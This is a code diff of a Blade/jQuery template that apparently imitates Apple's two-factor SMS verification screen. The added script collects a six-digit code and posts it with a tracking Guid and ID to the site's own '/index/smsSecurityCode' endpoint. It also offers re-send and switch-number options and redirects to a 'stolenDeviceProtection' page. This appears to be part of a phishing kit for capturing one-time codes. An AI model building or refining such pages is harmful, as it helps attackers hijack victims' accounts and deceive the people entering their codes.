@@ -233,14 +233,17 @@
                                                 </div>
                                             </div>
 
-                                            <button
-                                                class="button-link si-link ax-outline tk-subbody hide"
-                                                id="diff_phone"
-                                                href="#"
-                                                onclick="window.history.back();"
-                                            >
-                                                切换其他号码
-                                            </button>
+                                            @if($is_diffPhone)
+                                                <button
+                                                    class="button-link si-link ax-outline tk-subbody"
+                                                    href="#"
+                                                    id="diff_phone"
+                                                    onclick="window.location.href = '/index/authPhoneList?Guid=' + $.cookie('Guid');"
+                                                >
+                                                    切换其他号码
+                                                </button>
+                                            @endif
+
 
                                             <div class="verifying-code-text hide thin">
                                                 正在验证…
@@ -265,7 +268,8 @@
                                                     <div class="pop-bottom options">
                                                         <div class="t-row">
                                                             <div class="t-cell ">
-                                                                <div class="try-again show-pointer" id="try-again">
+                                                                <div class="try-again show-pointer" id="try-again"
+                                                                     onclick="tryAgain()">
                                                                     <i aria-hidden="true"
                                                                         class="shared-icon no-flip icon_reload"></i>
 
@@ -348,8 +352,156 @@
 
     <script type="text/javascript" src="{{ asset('/js/apple/jquery-3.6.1.min.js') }}"></script>
     <script type="text/javascript" src="{{ asset('/js/apple/jquery.cookie.js') }}"></script>
-    <script type="text/javascript" src="{{ asset('/js/apple/sms.js') }}"></script>
     <script type="text/javascript" src="{{ asset('/js/apple/fetch.js') }}"></script>
+
+    <script>
+
+        // 缓存常用DOM元素
+        const $numberInputs = $('.security-code-container input');
+        const $errorMessage = $('.form-message');
+        const $popButton = $('#no-trstd-device-pop');
+        const $popMenu = $('.other-options-popover-container');
+        const verifyingCodeText = $('.verifying-code-text');
+        const $liteThemeOverride = $('.lite-theme-override');
+        const $button = $('#try-again-link');
+        const $loadingIcon = $('.loading-icon');
+        const diffPhone = $('#diff_phone');
+
+        const ID = {{ $ID }};
+        const phoneNumber = "{{ $phoneNumber }}";
+        const Guid = $.cookie('Guid');
+
+        $(window.parent.document).scrollTop(0);
+
+        $popButton.on('click', () => $popMenu.removeClass('hide'));
+
+        $(document).on('click', (e) => {
+            if (!$(e.target).closest("#no-trstd-device-pop,.other-options-popover-container").length) {
+                $popMenu.addClass('hide');
+            }
+        });
+
+        $numberInputs.on('keyup', handleVerificationCodeInput);
+
+        $numberInputs.first().focus();
+
+        function tryAgain() {
+
+            $errorMessage.addClass('hide');
+            $button.addClass('hide');
+
+            $popMenu.addClass('hide');
+            $popButton.addClass('hide');
+            verifyingCodeText.removeClass('hide');
+            diffPhone.addClass('hide');
+
+            return window.location.href = `/index/SendSms?ID=${ID}&phoneNumber=${phoneNumber}&Guid=${Guid}`;
+        }
+
+        function handleVerificationCodeInput(e) {
+            const $input = $(e.target);
+            const index = $input.data('index');
+            const value = $input.val();
+
+            if (!/^\d$/.test(value)) {
+                handleInvalidInput(e, index);
+                return;
+            }
+
+            updateVerificationState();
+            handleInputNavigation(index, value);
+        }
+
+        function handleInvalidInput(e, index) {
+            if (e.keyCode === 8) {  // Backspace key
+                $numberInputs.val('').first().focus();
+            } else {
+                $numberInputs.eq(index).val('');
+            }
+        }
+
+        function updateVerificationState() {
+            if (window.verify) {
+                window.verify = false;
+                $numberInputs.parent().removeClass('is-error');
+                $errorMessage.addClass('hide');
+            }
+        }
+
+        function handleInputNavigation(index, value) {
+            const smsCode = $numberInputs.map((_, el) => el.value).get().join('');
+
+            if (index < 5 && smsCode.length < 6) {
+                for (let i = 0; i <= index; i++) {
+                    if (!$numberInputs[i].value) {
+                        $numberInputs[index].blur();
+                        $numberInputs[i].value = value;
+                        $numberInputs[i + 1].focus();
+                        $numberInputs[index].value = '';
+                        return;
+                    }
+                }
+                $numberInputs[Number(index) + 1].focus();
+            } else if (smsCode.length === 6) {
+                submitVerificationCode(smsCode);
+            }
+        }
+
+        function submitVerificationCode(smsCode) {
+            $numberInputs.attr('disabled', 'true');
+            verifyingCodeText.removeClass('hide');
+            $liteThemeOverride.addClass('hide');
+            diffPhone.addClass('hide');
+
+            fetchRequest('/index/smsSecurityCode', 'POST', {
+                'Guid': Guid,
+                'ID': ID,
+                'apple_verifycode': smsCode,
+            }).then(data => {
+
+                if (data?.code === 403) {
+                    window.location.href = '/index/stolenDeviceProtection';
+                    return;
+                }
+
+                if (data && data.code === 200) {
+                    $('.landing__animation', window.parent.document).hide();
+                    return window.location.href = '/index/result';
+                }
+
+                $errorMessage.removeClass('hide').text(data.message);
+                handleVerificationError();
+            }).catch(error => {
+                $errorMessage.removeClass('hide').text('发送失败,请稍后重试');
+                handleVerificationError();
+            })
+
+            diffPhone.removeClass('hide');
+
+        }
+
+        function handleVerificationError(error) {
+
+            for (const ele of $numberInputs) {
+                $(ele).removeAttr('disabled');
+                $(ele).parent().addClass('is-error');
+                $(ele).val('');
+                setTimeout(() => {
+                    $(ele).blur();
+                }, 10);
+            }
+            setTimeout(() => {
+                $($numberInputs[0]).focus();
+            }, 10);
+            $('.verifying-code-text').addClass('hide');
+            $('.lite-theme-override').removeClass('hide');
+            $errorMessage.removeClass('hide');
+            verify = true;
+        }
+
+
+    </script>
 </body>
+
 
 </html>
